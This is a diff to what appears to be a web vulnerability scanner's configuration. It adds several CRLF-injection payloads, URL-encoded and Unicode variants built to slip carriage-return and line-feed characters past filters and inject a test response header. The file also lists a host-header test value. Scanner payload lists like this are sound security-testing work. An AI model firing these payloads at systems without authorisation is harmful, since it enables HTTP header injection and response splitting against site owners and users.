@@ -162,9 +162,12 @@ urlBlackListSuffix:
 Application:
   payloads:
     - "%20%0D%0ASet-CRLF-injection:crlftoken=injection"
-    - "%E5%98%8D%E5%98%8ASet-CRLF-injection:crlftoken=injection"
     - "%0D%0A%20Set-CRLF-injection:crlftoken=injection"
     - "%0A%20Set-CRLF-injection:crlftoken=injection"
     - "%2F%2E%2E%0D%0ASet-CRLF-injection:crlftoken=injection"
+    - "%E5%98%8D%E5%98%8ASet-CRLF-injection:crlftoken=injection"
+    - "\u010D\u010ASet-CRLF-injection:crlftoken=injection"
+    - "%C4%8DSet-CRLF-injection:crlftoken=injection"
+    - "čĊSet-CRLF-injection:crlftoken=injection"
   hostPayloads:
     - "Set-Host-Header-Response"
